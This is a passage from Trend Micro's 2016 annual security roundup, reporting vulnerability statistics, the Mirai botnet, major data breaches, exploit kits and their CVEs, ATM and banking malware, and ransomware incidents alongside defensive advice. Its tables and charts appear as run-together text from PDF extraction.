Explorer still has the highest number of vulnerabilitiesamong all Microsoft products, the total volume of the vulnerabilities found on the platform got significantlylower. From 121 recorded vulnerabilities in 2015, it came down to only 33, indicating a 73% decrease.There are a few factors which may have affected this drop. Apart from Microsoft offering bounty programsfor bugs and vulnerabilities, the vendor has also been proactive in rolling out security patches. Instead ofmaking individual bulletins for each patch available, Microsoft is pooling all the updates into a single monthlydeployment.16 This streamlined approach is better at providing users with continued security.VendorProduct2015 vs. 2016VendorProduct2015 vs. 2016MicrosoftInternet ExplorerOffice\u00aeWindowsEdgeMSXMLChakra.NETReader53%26%47%73%\u25bc 100% \u25b2Windows Media\u00ae Center100% \u25b217%\u25bc 206% \u25b20DaysAndroidAdobeAppleSCADAFlashAcrobat Reader DCAcrobat Pro DCDigital EditionCreative Cloud\u00aeiOS\u00aeOS XQuickTime\u00aeSafari\u00ae8%43%0%\u25bc 421% \u25b2Table 2.Trend Micro and ZDI (with TippingPoint)discovered vulnerabilities 2015 versus 201611 | TrendLabs 2016 Security Roundup: A Record Year for Enterprise ThreatsThe number of vulnerabilities found in Apple products, on the other hand, saw a considerable rise in 2016.There were 81 vulnerabilities in its products in 2016\u2014a 145% increase from the 33 discovered vulnerabilitiesin 2015. Its desktop computing (OS X) and smartphone (iOS) products, both of which are used in enterprises,saw a 189% and 275% increase, respectively, in 2016. In October, attackers abused the iOS platformto replace a legitimate app in the App Store\u00ae with a malformed and enterprise-signed app. Through therepackaged and adware-laden apps, hackers were able to manipulate iOS\u2019s code signing process, andgranted them access to a user\u2019s personally identifiable information (PII) and banking credentials.Advantech\u2019s WebAccess had the most number of discovered vulnerabilities for 2016. These and otherSCADA vulnerabilities can be leveraged to compromise critical components in industrial automationnetworks. Many essential services and utilities, like water and electricity, rely on SCADA so failing to securethese systems could lead to real-world risks. An example of which was the power outage caused by amalware called BlackEnergy. The attack was directed against a power grid, which left about half of thehomes in a Ukrainian region with no access to electricity for several hours.18 For the list of other SCADAapplications with discovered vulnerabilities, refer to Table 5 in the Threat Landscape in Review section.As for mobile platforms, our data showed that Android vulnerabilities increased by 206% in 2016. A malwarevariant called DressCode allows attackers to gain access to internal networks every time devices withTrojanized apps are connected to them. At least 3,000 Trojanized apps were found in well-known Androidmarkets and even Google Play.19Knowing that there are a number of vulnerabilities on SCADA systems allows the private and public sectorsto develop an efficient security framework before attackers can find ways to exploit them. Initiatives like ZDI(founded by TippingPoint) can help in this aspect. ZDI rewards security researchers for responsibly reportingvulnerabilities in various products and platforms. After these vulnerabilities are disclosed, vendors createand deliver the patches.System administrators should make it a habit to apply security patches once they\u2019re made available. In theabsence of official vendor fixes, they can use virtual patching is an interim solution that will help protectsystems from possible zero days.12 | TrendLabs 2016 Security Roundup: A Record Year for Enterprise ThreatsMirai Botnet\u2019s Massive DDoS Attack Elevates IoT Security ConversationPreviously, attacks on IoT devices have only been proofs of concept (PoCs). Smart watches20 and smart lightbulbs21 were some of the connected devices that were repeatedly hacked by researchers to demonstratehow, with the right tools and methods, IoT devices can be exploited. All of these hacks have been isolatedcases; none of which have been replicated on a massive scale.During the last quarter of 2016, attackers\u2014through the use of the Mirai botnet\u2014targeted DNS provider Dynwith a distributed denial-of-service (DDoS) attack.22 Attackers hijacked approximately 100,000 vulnerableIoT devices such as security cameras to be part of a botnet.23 The large-scale attack against Dyn, whichcaused packet flow bursts of up to 50 times higher than its normal volume, forced various websites andservices to go offline for several hours. Some of Dyn\u2019s clients include Twitter, Reddit, and Spotify.Other reports of actual IoT device hacking also surfaced in recent months. FLOCKER ransomware on smartTVs, for example, pretends to be a law enforcement agency and accuses its victims of crimes they did notcommit. After displaying the warning, FLOCKER locks the device and demands US$200 worth of iTunes\u00aegift cards.24 Another incident left residents of two buildings in Finland out in the cold after a DDoS attacktook the buildings\u2019 environmental control systems down.25These recent attacks should serve as a wake-up call to enterprises. Attackers can now use IoT to attackan organization from within or from the outside. Vulnerable IoT devices and systems inside a network caneither be used as entry points for further attacks or they can be manipulated to disrupt operations. Andwhether or not organizations currently use IoT technology, they are still susceptible to business-haltingoutside threats like Mirai.13 | TrendLabs 2016 Security Roundup: A Record Year for Enterprise ThreatsEnd users should know that not all smart devices are built with security in mind. This makes users, therefore,responsible in securing their devices until all manufacturers implement robust security. Some of the firststeps toward maintaining security are to change passwords frequently and to keep a device\u2019s firmware up-to-date. IoT devices are often sold with default passwords, and neglecting to change passwords is alreadya case for potential abuse. For enterprises, implementing stronger IoT security policies within organizationsis a good start. They should also complement this by securing all the devices connected to their system.In the long run, the responsibility of providing IoT security lies heavily on the manufacturers. After all, notevery user could be expected to be fully aware of the risks involved in an attack. Securing communicationprotocols and devices\u2019 software development kits (SDKs) can protect against potential exploits, privacyintrusions, and malware infections that can lead to DDoS attacks.14 | TrendLabs 2016 Security Roundup: A Record Year for Enterprise ThreatsBiggest Data Breach in History Underscores Responsible Disclosure of CompaniesReports of a company suffering from a data breach are no longer a surprise. Time and again, we have seenhow organizations\u2014from education systems26 to healthcare institutions27\u2014can become a victim of databreaches.For instance, the recent Yahoo breach brought the issue of responsible disclosure to the fore. Yahoo hasbeen under a lot of scrutiny for the late disclosure of an August 2013 data breach that exposed over 1 billionof their users\u2019 accounts\u2014including names, dates of birth, email addresses, MD5-hashed passwords, andphone numbers.28 This makes it the biggest data breach in history. The recent disclosure came three monthsafter the company reported a separate breach in September, which involved 500 million accounts.Yahoo was severely criticized for the way they handled user information and for the time it took them todisclose the breaches. The magnitude of this breach raised concerns and questions on users\u2019 data security.Such an event emphasized how a company\u2019s policies in securing customer data have an effect on theirreputation. The crux of the matter is that companies are responsible for their customers\u2019 data and shouldmake it a priority to be accountable to them. Responding to data breaches not only entails getting to thebottom of the intrusion, but it\u2019s also about informing customers as well. When Leoni AG was scammed outof millions of dollars, the company released a statement shortly after on their site. The statement includesdetails of the fraudulent activity, the extent of the impact, and how they responded to the attack. Doing soaffirms an organization\u2019s commitment to protecting their customers\u2019 data and privacy.15 | TrendLabs 2016 Security Roundup: A Record Year for Enterprise ThreatsElexJuly 22 Almost 1.6M users accountsBon Secours Health SystemAugust 12 655K patients\u2019 recordsIllinois Board of ElectionsAugust 30 200K personal voter recordsClixSenseSeptember 14 6.6M user recordsWashington Department of Fish and WildlifeOctober 14 1.7M customers\u2019 personal recordsFourSquareOctober 21 22.5M user accountsMichigan State UniversityNovember 18 400K personal recordsGoogle AndroidNovember 30 Over 1M user accountsCommunity Health Plan of WashingtonDecember 21 382K members\u2019 personal informationJULDisney Consumer Products and Interactive MediaJuly 30 356K Playdom Forum users\u2019 recordsAUGEpic Games ForumsSEPOCTNOVAugust 23 808K user accountsBrazzers.comSeptember 6 Nearly 800K user informationYahoo!September 22 500M user accountsWeeblyOctober 20 43M recordsFriendFinderNovember 16 412M user accountsDECUnited States Navy Career WaypointsNovember 23 134K user accountsYahoo!December 14 1B user accountsNote: Of the data breaches with more than a hundred thousand records stolen, hacking was found to be the most common method. Additionally, reported data breaches in the U.S. reached an all-time record high in 2016, increasing by 40% over the 2015 figures.29Figure 6.Timeline of data breaches, 2H 2016Data from privacyrights.org16 | TrendLabs 2016 Security Roundup: A Record Year for Enterprise ThreatsEnterprises should have security solutions with breach detection systems that will allow them to monitornetwork traffic across all ports, spot any irregularities, and prevent attackers from infiltrating systems.Custom sandboxing can also provide enterprises the ability to analyze malware, detect any C&Cactivity, and identify other hacking techniques used in data breaches. Additionally, deploying machinelearning techniques allows quick and accurate identification of whether network content\u2014be it files orbehaviors\u2014are malicious or not.17 | TrendLabs 2016 Security Roundup: A Record Year for Enterprise ThreatsAngler Leaves the Scene with Other Exploit Kits RisingBy the third quarter of the year, the once dominant Angler exploit kit disappeared. Following the arrest of50 cybercriminals on June 2016,30 Angler detections dwindled and ceased to exist. Since then, attackersswitched to other exploit kits to up the ante.The Neutrino exploit kit picked up the pace by distributing CRYPMIC, WALTRIX, and CERBER 4.0ransomware.31 However, by September, there were lower access numbers of Neutrino as it dropped outof active circulation in the underground and moved to cater to select clientele.32 The Rig exploit kit alsotook advantage of Angler\u2019s absence when it distributed CERBER,33 LOCKY,34 and MILICRY ransomwarein a malvertising campaign.35 The campaign abuses legitimate services such as Google Maps, Imgur, andPastee to infect systems and lock files with ransomware.1.2M0.6M0Angler SundownJANFEBMARAPRMAYJUNJULAUGSEPOCTNOVDECFigure 7. Number of access to exploit-kit-hosting URLs, 2016Other exploit kits also had updates in their techniques. Bizarro Sundown was spotted in early Octoberand was used to compromise sites and deliver two versions of LOCKY ransomware.36 Sundown malwaredesigners, on the other hand, incorporated steganography to hide their exploit code in seemingly harmlessimage files.3718 | TrendLabs 2016 Security Roundup: A Record Year for Enterprise ThreatsMore exploit kits distributed ransomware in 2016. The recent variant of the notorious CERBER ransomwarefamily, for example, was incorporated in several infection campaigns.38 CERBER 4.0 emerged in earlyOctober and became popular to cybercriminals who wanted to use the malware in malvertising campaignsand to compromise sites. Neutrino, Magnitude, and Rig are three of the prominent exploit kits that deliveredCERBER 4.0 in 2016. Compared to the time when Angler was in active distribution in 2015, 2016 saw asignificant decrease in vulnerabilities included in exploit kits.Exploit KitAnglerNeutrinoMagnitudeRigNuclearSundownHunter LOCKYTable 3. Ransomware families delivered by exploit kits19 | TrendLabs 2016 Security Roundup: A Record Year for Enterprise ThreatsSundown Exploit KitMicrosoft SilverlightCVE-2016-0034Microsoft InternetExplorerCVE-2016-0189Neutrino Exploit KitAdobe Flash CVE-2016-4117 CVE-2016-1019Microsoft InternetExplorerCVE-2016-0189AnglerExploit KitAdobe Flash CVE-2016-4117 CVE-2016-1001Microsoft SilverlightCVE-2016-0034Nuclear CVE-2016-1019RigExploit KitMicrosoft SilverlightCVE-2016-0034Microsoft InternetExplorerCVE-2016-0189Magnitude Exploit KitAdobe Flash CVE-2016-4117 CVE-2016-1019Microsoft InternetExplorerCVE-2016-0189Figure 8. Exploits to specific vulnerabilities included in certain exploit kits, 2016In 2015, there were a total of 17 recorded vulnerabilities that were included in exploit kits. By 2016, thisnumber significantly dropped to five, marking a 71% overall decrease. Adobe Flash remained to be theproduct with the most number of vulnerabilities used by exploit kits. This number, however, decreased by80% in 2016.157.51580% change2015 ExplorerFigure 9. Number of specific vulnerabilities included in exploit kits 2015 versus 2016Despite dwindling numbers in 2016, exploit kits still remained in the arsenal of many cybercriminals andattackers. Exploit kits still fit into malvertising, ransomware attacks, and other cybercriminal campaigns. Theeffectiveness of these kits against a platform or system is very much dependent on how secure or vulnerableit is. This is why the use of legacy systems puts enterprises at risk. It\u2019s always critical for organizations tokeep their software and operating systems (OS) up-to-date with the latest security patches to ensure all theyare protected from potential abuse.Virtual patching can eliminate risk exposure by shielding vulnerabilities while an official patch is unavailable.Enterprises can look into this option for ease of deployment and better scalability without using up a lot ofresources. Security solutions with high-fidelity machine learning can also help detect and block exploits inreal time.20 | TrendLabs 2016 Security Roundup: A Record Year for Enterprise ThreatsBank Hacking Perseveres with Banking Trojans and ATM Malware DevelopmentsWith the use of malware and skimming cards, gaining quick profits from ATMs became easier forcybercriminals. ATM malware has been around for a while now, with the Skimer variant first observed in2009. Since then, Skimer was recently updated to turn ATMs into skimming machines.39Eastern EuropeSkimerFirst found: 2009 Language: Delphi Goal: Dispense/SkimPloutusFirst found: 2013 Language: .NET Goal: DispensePadpicFirst found: 2014 Language: .NET Goal: DispenseSucefulGreen DispenserNeoPocketFirst found: 2015 Language: Borland C++ Goal: Prototyping toolFirst found: 2015 Language: Visual C++ Goal: DispenseFirst found: 2014 Language: VB Goal: SkimFigure 10. ATM malware families and their geographical origins40One of the primary reasons cybercriminals continue to use ATM malware is because many of the machinesstill run outdated operating systems like Windows\u00ae XP Embedded. This particular OS is vulnerable sinceMicrosoft already ended support for it in 2016,41 meaning all systems running Windows XP Embedded maybe susceptible to attacks since the vendor will no longer release security patches.21 | TrendLabs 2016 Security Roundup: A Record Year for Enterprise ThreatsTo diversify their attacks, cybercriminals continued to use different variants of ATM malware. Recently wediscovered a bare-bones ATM malware called ALICE that had been in the wild since October 2014.42 Whatmakes ALICE particularly noteworthy is that it makes no attempt to connect to other ATM-specific hardware,such as the machine\u2019s numeric pad, in order to empty an ATM\u2019s safe. It also has no elaborate install oruninstall mechanism. It works as soon the cybercriminal runs the executable in the target environment.ALICE\u2019s design suggests that a cybercriminal would need to physically open the ATM and infect the machine byusing a CD-ROM or USB. The criminal would then need to connect a keyboard to the machine\u2019s motherboardto execute the malware.Q1151,533Q2109,040Q3141,529Q4142,577QAKBOT55,580RAMNIT45,988RAMNIT35,689DORKBOT11,142DORKBOT12,380ZBOT11,028ZBOTDRIDEXFAREITBEBLOH11,53310,0164,7643,532QAKBOTBEBLOHFAREITDRIDEX7,9476,7754,7234,389BANLOAD2,281BANLOAD1,962DOFOILBANKER2,1821,742BankerURSNIF1,7281,617Others11,834Others11,741RAMNITBEBLOHZBOTQAKBOTURSNIFDORKBOTBANLOADFAREITBANKERDRIDEXOthers43,65741,6329,7959,1588,8778,8613,6213,5822,1041,3878,855RAMNIT38,963BEBLOH35,536MIPONY13,089URSNIF13,026ZBOT9,947DORKBOT8,165QAKBOTFAREIT4,5083,560BANLOAD2,235BANKER1,980Others11,568Figure 11. Top banking malware families, 2016On the other hand, banking Trojans still shared the spotlight for banking-related threats. Earlier this year,QAKBOT detections reemerged after the malware authors of the DYRE/DYREZA banking malware werearrested.43 By the second quarter of the year, however, the RAMNIT banking Trojan resurfaced with twonew live attack servers and a new C&C server.44 The banking Trojan\u2019s long period of silence, since theattempted takedown of RAMNIT servers in 2015,45 ended when RAMNIT targeted major banks in the UnitedKingdom.46 The banking Trojan also managed to maintain its presence toward the end of the year.22 | TrendLabs 2016 Security Roundup: A Record Year for Enterprise ThreatsAs ATM malware and banking Trojans continue to spread, banking institutions are responsible forguaranteeing the security of their systems by ensuring the physical security of their ATMs, updatingoperating systems, and devoting the time to regularly inspect and address any software vulnerabilities withequipment manufacturers. We also recommend implementing solutions that provide application control andwhitelisting. Deploying such features will block the installation or usage of applications that are not includedin the whitelist.When it comes to the responsibility of securing online transactions, consumers also have a role to play.After all, they are also exposed to these banking-related threats every time they perform on-site and onlinebanking transactions. Through the use of banking malware, for example, cybercriminals may gain access toa user\u2019s PII and credentials. Knowing this, users should regularly change banking-related passwords and/orPINs and remain vigilant when doing online transactions. Enterprises should also adopt endpoint machinesolutions with advanced anti-malware protection and employ two-factor authentication on their sites tosecure online banking sessions. Additionally, it is also recommended for bank users to secure various entrypoints such as web, file, and email.23 | TrendLabs 2016 Security Roundup: A Record Year for Enterprise ThreatsThreat Landscape in ReviewOver 81 billion threats were blocked by the Trend Micro\u2122 Smart Protection Network\u2122 in 2016, a 56% increasefrom the total number of blocked threats in 2015. This increase is largely drawn from the total number ofemail threats blocked throughout the year and is consistent with the growth of ransomware and BEC, whichare both widely propagated through email or spam.90B45B082B65B52B34B27B29B2014201520161st halfFigure 12. Overall threats blocked by the Trend Micro Smart Protection Network, 20163,348/sec2,177/sec1,950/sec1,692/sec1,572/sec1,813/sec3,5001,75002014201520161st half2nd halfFigure 13. Number of threats blocked per second, 201624 | TrendLabs 2016 Security Roundup: A Record Year for Enterprise Threats80B75B50B44B40B27B22B26B02014201520161st half2nd halfFigure 14. Number of email threats blocked, 20164B3.82B2B02.57B1.80B1.74B1.55B860M2014201520161st halfFigure 15. Number of malicious URLs blocked, 201625 | TrendLabs 2016 Security Roundup: A Record Year for Enterprise Threats12B10.96B6B5.42B5.16B5.30B2.75B2.10B02014201620151st halfFigure 16. Number of malicious files blocked, 2016100M50M0JANFEBMARAPRMAYJUNJULAUGSEPTOCTNOVDECDOCXLSRAREXEDOCXHTMLXLSXSCRPDFCOMHTMRTFBINJSVBSWSFDOCMJSEOthersThe upsurge of JavaScript attachments in spam from the month of June is primarily caused byransomware-related spam.Figure 17. Top file attachments seen in ransomware-related spam according to file type, 2016Note: The significant surge in JavaScript attachments in November was caused by NEMUCOD, a known ransomware dropper. LOCKY ransomware distributed via email also contributed to this surge.26 | TrendLabs 2016 Security Roundup: A Record Year for Enterprise ThreatsUniversity GastroenterologyJuly 11 United States Encrypted files from file storage system from an acquired practice47United States United Food and Commercial Workers Local 655 Pension FundJuly 21 information of current and former members of a union in Missouri. 49New Jersey Spine CenterJuly 27 United States Paid undisclosed amount of ransom to gain access to encrypted files51Appalachian Regional HospitalsAugust 27 United States Forced to do manual work due to locked-down system53The North Dakota Department of Mineral ResourcesSeptember 12 United States Victim was told to pay US$350, but data was restored in 24 hours through off-site backup data55JULWoodbury County Of\ufb01ceJuly 20 United States Encrypted 3,700 files without backup48Marin Medical Practices ConceptsJuly 26 United States Lost 5,000 patient records and 2 weeks\u2019 worth of backup50AUGSarasota City HallAugust 20 United States Shut down all computer systems for more than a day52Kobe UniversitySeptember 7 Japan One of the PCs infected stored students\u2019 personal records54Yuba-Sutter Medical ClinicSeptember 12 United States Disrupted operations due to limited access to data56SEPT27 | TrendLabs 2016 Security Roundup: A Record Year for Enterprise ThreatsKeck Medical CenterSeptember 20 United States Affected two servers that store patients\u2019 records58VESKSeptember 29 United Kingdom Paid US$23,000 to recover access to one of its systems from a Samas DR ransomware attackRainbow Children\u2019s ClinicOctober 17 United States Encrypted patients\u2019 records61Seguin dermatology practiceNovember 11 patients\u2019 data, Social Security numbers, medical services billing codes63Madison County Of\ufb01ceNovember 15 United States Paid US$28,000 to decrypt files65SEPOCTNOVSpring\ufb01eld City HallSeptember 20 United States Files were inaccessible for 10 days57Palmhurst Police DepartmentSeptember 22 United States Years\u2019 worth of data took a week to restore59Urgent Care Clinic of OxfordOctober 4 United States Compromised patients\u2019 data including names, Social Security numbers, dates of birth, health data, and other personal information60Diana, Princess of Wales Hospital, Scunthorpe General Hospital, and Goole and District HospitalOctober 31 United Kingdom Doctor appointments and other operations got canceled62Menomonee Falls local businessNovember 14 United States System got locked down and the business was told to pay US$5,6726428 | TrendLabs 2016 Security Roundup: A Record Year for Enterprise ThreatsBigfork School DistrictNovember 24 United States Encrypted students\u2019 records and other files67Howard County Of\ufb01ceNovember 29 United States Encrypted 33,000 files68Henry County Of\ufb01ceDecember 8 United States Exposed personal information including names, addresses, phone numbers, and license numbers70East Valley Community Health CenterDecember 22 United States Affected 65,000 individuals\u2019 records that may include personal, medical, and insurance information72NOVSpencer Chamber of CommerceDECNovember 18 United States Affected all computer systems66San Francisco Municipal Transportation AgencyNovember 28 United States Locked down the light rail system\u2019s machines that led to passengers grabbing free ridesCarleton UniversityNovember 29 Canada Locked university\u2019s computers and files69Carroll County Sheriff\u2019s Of\ufb01ceDecember 14 United States Paid US$2,400 to recover files71Figure 18. Ransomware incidents made public, 2H 201629 | TrendLabs 2016 Security Roundup: A Record Year for Enterprise ThreatsJANFEBMARAPRMAYJUNJULAUGSEPOCTLECTOOLCRYPNISCACRYPGPCODEMADLOCKERCERBERMAKTUBCRYPTOSOCRYPTEAR 1.0CRYPSALAMWALTRIXCRYPCOREROKKUAUTOLOCKYSNSLOCKZCRYPTBUCBIJIGSAW 2.0CRYPAGAJSRAACRYPSHOCKERMIRCOPSATANACRYPMIC 2.0RUSHTEARHOLYCRYPTTILDEBANKTEARCERBER 2.0CRYPHYDRA 2.0SHARKRAASATILOCKTEARPURGEFANTOMCRYPTCRYPMIC 3.0CUCKTOXKAWAIILOCKERATOMJOKEMARSCRYPTTRXMILICRYENCRYPTILECOMLINECRYPTBTNCLICKMEGVENISCOMCIRCLEHADESLOCKEMPERCRYPJOKERCRYPHYDRA 1.0LOCKYCRYPAURASURPRISECOVERTONCRYPSAMCRYPTOHOST 1.0ZIPPYCRYPLIKIBRLOCKMISCHABLOCCATOELFACRYPTCRYPDAPWALTRIX 3.0WALTRIX 4.0CRYPCUTEWHITELOCKXORISTZIRBAMFAKELOCKWALTRIX 5.0STAMPADO 1.0JAGERBAKSOCUTESHINOLOCKCRYPZXASCRYPTLOCKDETOXCRYPTO 1.0BART 2.0CERBER 3.0RARVAULTSTAMPADO 2.0CRYPRADAMCRYPRITUCRYPDAPKERANGERPETYACRYPTOHASUXORBATEMPER 2.0CRYPALPHACRYPMAMEWALTRIX 2.0TAKALOCKERLOCKSCAMCRIPTODCCRYPHERBSTGOOPICCYPHERKEYLOCKRVTNBARTALFAJUSINOMELPOWERWARE 2.0UYARITEARVENUSLOCKLERITHPOGOTEARKAOTEARSCRNLOCKERWILDFIREELFREXDDOSHDDCRYPTORCRYPYMEMEKAPCRYPZUQUITTESLAPOWERWARE 1.0KIMCILJIGSAWCRYPVAULTSHUJINENIGMABADBLOCKDEMOCRYCRYPEDAAPOCALYPSECRYPKEYIVJOKOZYCRYPMIC 1.0ZIPTBSANCTEARNOOBCRYPTCRYPBEETELANATEARREKTEDACRYPTOHOST 2.0FSOCEDAALMALOCKDOMINOSERPICOCRYPTEAR 2.0EDALOCKHIDDENTEARDEVMAREHIDDENTEARBLACKFEATHER FENIXEREBUSDETOXCRYPTO 2.0PRINCESSLOCKERSTOPICRYSISEDA2MASTERBUSTERESMERALDAHORCRUXNULLBYTEJACKPOTLOCK93SHOR7CUTNUCLEARSONIDOCRYPTGOEDA2BLAWILCRYPTEDA2ANUBISENIGMAKOSTYAALCATRAZTENSECANGRYDUCKEXOTICHIDDENTEARSHADOWHIDDENTEARAPTHIDDENTEARNOTORIOUSEDA2NOTORIOUSCRYPTOTROOPEREDA2JANBLEEDKILLERLOCKERLERITH 2.0CERBER 4.030 | TrendLabs 2016 Security Roundup: A Record Year for Enterprise ThreatsMATRIXCRYPSHEDLOMIXCERBER 5.0.0RARLOCKEXOSHELLCRYPTONKARMAAIRACROPHIDDENTEARCERBERSMASHLOCKRAZYCRYPTHIDDENTEARGUSTERBRAINCRYPTMFESTUSCRYPTORIUMANTIXCERBER 5.0.xNOVDECCRYPHYDRAPSHELLHIDDENTEARDECRYPTORSPICYCRYPTEDA2RUNSOMECERBER 4.1.6CRYPTOWIRERANSOCCITOXERUNELOCKERCRYPTASN1CHIPHAPPYLOCKERCRYPTOLUCKHIDDENTEARHAPPYPCLOCKCRYSIS 2.0VINDOWSCERBER 5.0.1HIDDENTEARHOLLYHOTDEMPROTOBTCSURVEYLOCKTELECRYPTILOCKEDPAYDOSZEROCRYPTADAMLOCKDERIALOCKDONATOCRYPEXTXXGOLDENEYEMICROPHIDDENTEARFSOCIETYCRYPAYSAFEISHTARHIDDENTEARHCRYPTOGREMITDXXDBADCRIPTSEOIRSEAYTEPSCRLOCKERPOPCORNTYMEDGELOCKERHIDDENTEARKOKOFREROGACRYPBLOCKLEVILOCKDESBLOQNote: Ransomware families discovered in the first half of 2016 have been updated.Table 4. New ransomware families seen, 2016VendorProduct nameVendorProduct nameABBAdvantechAdvantechDeltaEatonEcavaFatekDataManagerProSUSIAccessWebAccessDelta Industrial AutomationELCSoftIntegraXorFatek AutomationUnitronicsIBHsoftecS7-SoftPLCWe-conPanasonicPro-faceRockwell AutomationFPWINProGP-Pro EXRSLogix Micro Starter LiteSchneider Electric SoMachine HVACSiemensTrihedralSINEMA ServerVTScadaVisiLogicLevistudioTable 5. SCADA applications with discovered vulnerabilities, 201631 | TrendLabs 2016 Security Roundup: A Record Year for Enterprise Threats2015 Total7142016 Total765High:Medium:Low:37.96%60.22%1.54%High:Medium:Low:37.12%61.44%1.05%Note: While there is an increase in the number of vulnerabilities discovered and reported, most of thevulnerabilities are categorized as having Medium impact (according to the Common Vulnerability Scoring System (CVSS) rating).In addition, a very small percentage of the total vulnerabilities have no CVSS scores as of this writing.Table 6. Trend Micro and ZDI CVSS statsQ1 208KASIDET167POSNEWTDEXTRPOCARDLALINAPOSLOGRPOSFIGHTABADDONPOSDEXTERPWNPOSOthers51494135272521201569KASIDETPOCARDLALINAPOSFIGHTDEXTRPOSNEWTPWNPOSHUNTPOSPOSLOGRALINAOSOthers454035343330151311626POSNEWTPOCARDLDEXTRALINAKASIDETPOSFIGHTPOSLOGRJACKPOSPOSHOOKALINAOSOthers4638312612111088736Figure 19. Top PoS malware families, 2016ALINAGORYNYCHPOCARDLFASTPOSPOSNEWTDEXTRKASIDETRAWPOSTINYPOSPOSFIGHTOthers262520151512111111105232 | TrendLabs 2016 Security Roundup: A Record Year for Enterprise ThreatsSATANABARTMIRCOPJOKOZYCRYPSHOCKERCRYPKEYIVCRYPCUTEJSRAAJIGSAW 2.0WALTRIX 3.0CRYPEDAWALTRIX 4.0XORISTCRYPMIC 1.0CRYPMAMEROKKUAUTOLOCKYMISCHAWALTRIX 2.0ENIGMATAKALOCKERBADBLOCKZCRYPTELFACRYPTCRYPDAPCRIPTODCCRYPTOHOST 1.0XORBATJIGSAWWALTRIXDatabase WebsiteSQLTaxCADVD\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022ZIPPYEMPER 2.0CRYPVAULTCRYPCORECRYPLIKICRYPALPHACERBERCRYPAURAKERANGERTESLAMAKTUBPETYACRYPTOSOKIMCILCRYPTEAR 1.0CRYPSAMCRYPGPCODECRYPDAPMADLOCKERLOCKYLECTOOLEMPERCRYPRADAMCRYPNISCACRYPJOKERCRYPRITUSANCTEARCRYPBEEVENUSLOCKREKTEDAPOGOTEARDatabase WebsiteSQLTaxCADVD\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u202234 | TrendLabs 2016 Security Roundup: A Record Year for Enterprise ThreatsDatabase WebsiteSQLTaxCADVDBAKSOCUTEATILOCKTEARSHOR7CUTLOCK93ISHTARHIDDENTEARCERBERHIDDENTEARFSOCIETYHIDDENTEARHAPPYCRYPTOLUCKCRYPTONHIDDENTEARHOLLYEDA2RUNSOMEHIDDENTEARDECRYPTORHIDDENTEARKOKOCRYPMIC 2.0ALFARUSHTEARWALTRIX 5.0HOLYCRYPTSTAMPADO 1.0POWERWARE 2.0UYARITEARHDDCRYPTORJOKEMARSEREBUSDETOXCRYPTO 2.0PRINCESSLOCKERDXXDEDA2JANBLEED\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u202235 | TrendLabs 2016 Security Roundup: A Record Year for Enterprise ThreatsHADESLOCKHIDDENTEARAPTKOSTYAHIDDENTEARSHADOWENIGMACRYPTBTNEDA2BLAZEROCRYPTCRYPHYDRAPSHELLCRYSIS 2.0CRYPSHEDSPICYCRYPTVINDOWSHOTDEMPROTOBTCCITOXEPCLOCKHIDDENTEARGUSTERSEOIRSEANTIXGOLDENEYEPOPCORNTYMMIRCOPDatabase WebsiteSQLTaxCADVD\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022Table 7. Business-related files encrypted by known ransomware families, 201636 | TrendLabs 2016 Security Roundup: A Record Year for Enterprise ThreatsReferences1. Maria Korolov. (5 January 2017). CSO Online. \u201cRansomware took in $1 billion in 2016\u2014improved defenses may not be enough to stem the tide.\u201d Last accessed on 17 January 2017, url billion-in-2016-improved-defenses-may-not-be-enough-to-stem-the-tide.html2. Mary Yambao and Francis Antazo. (22 November 2016). TrendLabs Security Intelligence Blog.\u201cBusinesses as Ransomware\u2019s Goldmine: How Cerber Encrypts Database Files.\u201d Last accessed on 17 January 2017, url security-intelligence/how-cerber-encrypts-database-files/3. Thomas Fox-Brewster. (28 November 2016). Forbes. 